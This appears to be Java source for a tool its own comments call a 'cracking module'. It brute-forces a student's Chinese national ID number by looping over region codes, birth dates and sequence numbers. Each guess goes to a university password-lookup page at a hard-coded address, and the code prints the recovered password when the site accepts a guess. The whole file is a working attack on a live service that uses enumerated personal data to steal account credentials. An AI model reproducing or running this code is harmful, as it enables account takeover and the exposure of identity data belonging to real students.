package com.venk.ufpasspos;

import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

/**
 * @Description: 破解模块
 * @author: Venk007
 * @date: 2015年12月4日下午9:41:39
 * 
 */
public class PassPos {

	public static void passPos(String schoolId, int startYear, int startMonth,
			int startDay, int endYear, int endMonth, int endDay, String sex,
			String province, String city) {
		boolean result = false;
		final String url = "http://218.195.32.11/(pmtpo355krszuk551rtvejb4)/mmcx.aspx";
		final String whatTheHeHe = "__VIEWSTATE=dDwxODY3NzcwMTYwO3Q8O2w8aTwxPjs%2BO2w8d"
				+ "Dw7bDxpPDE1PjtpPDE3Pjs%2BO2w8dDxwPDtwPGw8b25jbGljazs%2BO2w8cmV0dXJuI"
				+ "ENoZWNrSW5wdXQoKVw7Oz4%2BPjs7Pjt0PHA8bDxWaXNpYmxlOz47bDxvPGY%2BOz4%2"
				+ "BOzs%2BOz4%2BOz4%2BOz4TDCMSzWeeL1b9NqMfmU4TIhxIwg%3D%3D";
		// 乱七八糟的代码
		final String ddlUserType = "%D1%A7%C9%FA";
		final String btSearch = "+%B2%E9+%D1%AF+";
		final int KEY = 1;
		String Name = null;
		String startPos = "%E5%BC%80%E5%A7%8B%E7%A0%B4%E8%A7%A3...";
		String uc = "UTF-8";		
		String boy = "%E7%94%B7";
		String girl = "%E5%A5%B3";
		String n = "\n";
		String successMsg1 = "%E7%A0%B4%E8%A7%A3%E6%88%90%E5%8A%9F%21";
		String successMsg2 = "********";
		String successMsg3 = successMsg2.concat(successMsg2).concat(successMsg2);
		String successMsg1Dc = successMsg2.concat(Decode.urlDecode(successMsg1,uc)).concat(successMsg2);
		String successMsgXh = "%E5%AD%A6%E5%8F%B7%3A+";
		String successMsgXhDc = Decode.urlDecode(successMsgXh,uc);
		String successMsgXm = "%E5%A7%93%E5%90%8D%3A+";
		String successMsgXmDc = Decode.urlDecode(successMsgXm,uc);
		String successMsgPd = "%E5%AF%86%E7%A0%81%3A+";
		String successMsgPdDc = Decode.urlDecode(successMsgPd,uc);
		String downPer = "%E5%B7%B2%E6%89%A7%E8%A1%8C";
		String downPerDc = Decode.urlDecode(downPer,uc);
		String sysExit = "%E7%A8%8B%E5%BA%8F%E5%B7%B2%E7%BB%88%E6%AD%A2";
		String sysExitDc = Decode.urlDecode(sysExit,uc);
	
		int firstPoint, endPoint;
		int rangeStart = 0;
		int rangeEnd = 1000;
		int rangeStep = 1;

		if (Decode.urlDecode(boy,uc).equals(sex)) {
			rangeStart = 1;
			rangeStep = 2;
		} else if (Decode.urlDecode(girl,uc).equals(sex)) {
			rangeStart = 0;
			rangeStep = 2;
		}

		Calendar start = Calendar.getInstance();
		start.set(startYear, startMonth - 1, startDay);
		Calendar end = Calendar.getInstance();
		end.set(endYear, endMonth - 1, endDay);

		// SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd");

		try {
			Name = IdToName.idToName(schoolId,KEY);
		} catch (UnsupportedEncodingException e1) {
			e1.printStackTrace();
		}
		if ("false".equals(Name)) {
			System.out.println(sysExitDc);
			System.exit(0);
		} else{
			System.out.println(Decode.urlDecode(startPos,uc));
		}
		StringBuffer idNumBuf = new StringBuffer();
		String encodeName = null;
		try {
			encodeName = java.net.URLEncoder.encode(Name, "GB2312");
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		}
		
		List<String> localId=new ArrayList<String>(LocalId.localToId(province, city));

		venklable1:

		/**
		 * 地区循环模块
		 */
		for(String local:localId){
			System.out.println("当前地区码: " + local);
			
			// 重置日期
			start.set(startYear, startMonth - 1, startDay);
			end.set(endYear, endMonth - 1, endDay);
			SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd");
			
		/**
		 * 日期循环模块
		 */
		while (start.compareTo(end) <= 0) {

			// 打印循环到的日期
			System.out.println(format.format(start.getTime()));
			
			// Boy or Girl (显示日期内进度的值)
			for (int i : Range.range(rangeStart, rangeEnd, rangeStep)) {

				String str = String.format("%03d", i);
				idNumBuf.replace(0, idNumBuf.length(), "");

				idNumBuf.append(local)
						.append(format.format(start.getTime())).append(str);
				idNumBuf.append(CalcCap.calcCap(idNumBuf));

				String sr = HttpRequest.sendPost(url, whatTheHeHe + "&txtIdNo="
						+ schoolId + "&txtName=" + encodeName
						+ "&txtIdentityNo=" + idNumBuf + "&ddlUserType="
						+ ddlUserType + "&btSearch=" + btSearch);

				if (sr.contains("lbl")) {

					firstPoint = sr.lastIndexOf(Decode.urlDecode("%E7%A0%81",
							"UTF-8"));
					endPoint = sr.lastIndexOf(Decode.urlDecode("%E8%AF%B7",
							"UTF-8"));

					String ufpasspos = sr.substring(firstPoint + 40,
							endPoint - 15).trim();
					System.out.println(successMsg1Dc + n + successMsgXhDc + schoolId 
							+ n + successMsgXmDc + Name + n + successMsgPdDc 
							+ ufpasspos + n + successMsg3);
					result = true;
					break venklable1;
				} else {
					
					// 显示日期内的进度 (可注释掉，启用会降低破解速度)
					if(i%10==rangeStart){ System.out.println(downPerDc + (i/10) + "%"); }			
				}
			}
			start.set(Calendar.DATE, start.get(Calendar.DATE) + 1);
		}
	}
		if(!result){
			System.out.println("破解不成功，请检查所填信息是否准确");
		}
	}
}
